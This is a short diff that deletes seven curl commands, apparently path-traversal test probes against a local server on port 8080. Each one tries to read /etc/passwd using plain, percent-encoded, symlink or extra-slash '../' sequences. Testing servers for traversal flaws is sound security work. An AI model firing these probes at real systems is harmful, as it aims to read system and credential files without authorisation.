@@ -1,7 +1,0 @@
-curl -v http://localhost:8080/../../etc/passwd
-curl -v http://localhost:8080/%2e%2e/%2e%2e/etc/passwd
-curl -v http://localhost:8080/%2e%2e/%2e%2e/etc/passwd
-curl -v http://localhost:8080/symlink/../../../etc/passwd
-curl -v http://localhost:8080/../../../etc/passwd
-curl -v http://localhost:8080/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-curl -v http://localhost:8080////../../../etc/passwd
